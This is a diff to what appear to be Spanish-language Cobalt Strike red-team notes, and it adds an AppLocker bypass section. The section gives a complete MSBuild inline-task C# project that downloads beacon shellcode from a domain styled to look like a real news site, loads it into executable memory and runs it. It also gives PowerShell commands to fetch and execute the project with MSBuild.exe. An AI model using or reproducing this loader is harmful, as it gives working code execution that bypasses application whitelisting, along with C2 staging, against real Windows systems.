@@ -186,3 +186,162 @@ beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 ```powershell
 beacon> jump psexec64 lon-ws-1 smb
 ```
+
+
+## AppLocker
+
+ - Asegurate de hacer todo el bypass anterior, luego hostea un archivo en cobalt:
+
+```powershell
+1. Hostea el http_x64.xprocess.bin
+2. Url usa -> www.bleepincomputer.com
+3. the ruta pon beacon.bin
+```
+
+- Luego crea en visual este codigo:
+```c
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+
+  <Target Name="MSBuild">
+
+   <MSBuildTest/>
+
+  </Target>
+
+   <UsingTask
+
+    TaskName="MSBuildTest"
+
+    TaskFactory="CodeTaskFactory"
+
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+
+     <Task>
+
+      <Code Type="Class" Language="cs">
+
+        <![CDATA[
+
+  
+
+            using System;
+
+            using System.Net;
+
+            using System.Runtime.InteropServices;
+
+            using Microsoft.Build.Framework;
+
+            using Microsoft.Build.Utilities;
+
+  
+
+            public class MSBuildTest : Task, ITask
+
+            {
+
+                public override bool Execute()
+
+                {
+
+                    byte[] shellcode;
+
+                    using (var client = new WebClient())
+
+                    {
+
+                        client.BaseAddress = "http://www.bleepincomputer.com";
+
+                        shellcode = client.DownloadData("beacon.bin");
+
+                    }
+
+                    var hKernel = LoadLibrary("kernel32.dll");
+
+                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
+
+                    var hCt = GetProcAddress(hKernel, "CreateThread");
+
+  
+
+                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
+
+                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);
+
+  
+
+                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
+
+                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);
+
+  
+
+                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
+
+                    WaitForSingleObject(t, 0xFFFFFFFF);
+
+  
+
+                    return true;
+
+                }
+
+  
+
+            [DllImport("kernel32", CharSet = CharSet.Ansi)]
+
+            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+
+            [DllImport("kernel32", CharSet = CharSet.Ansi)]
+
+            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+  
+
+            [DllImport("kernel32")]
+
+            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+  
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+
+            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+
+            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+  
+
+            }
+
+  
+
+        ]]>
+
+      </Code>
+
+    </Task>
+
+  </UsingTask>
+
+</Project>
+```
+
+
+- Ve a la ruta de ese archivo y ejecutalo
+
+```powershell
+C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe .\test.csproj
+```
+
+- Luego en otra maquina lo puedes hostear el test.csproj en cobal y descargrlo
+```powershell
+1. Hosteas con la ruta /test.csproj y url www.bleepincomputer.com
+
+2.  Descargar Invoke-WebRequest -Uri "http://www.bleepincomputer.com:80/test.csproj" -OutFile "test.csproj"
+
+3. Ejecutas -> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe .\test.csproj
+```
+
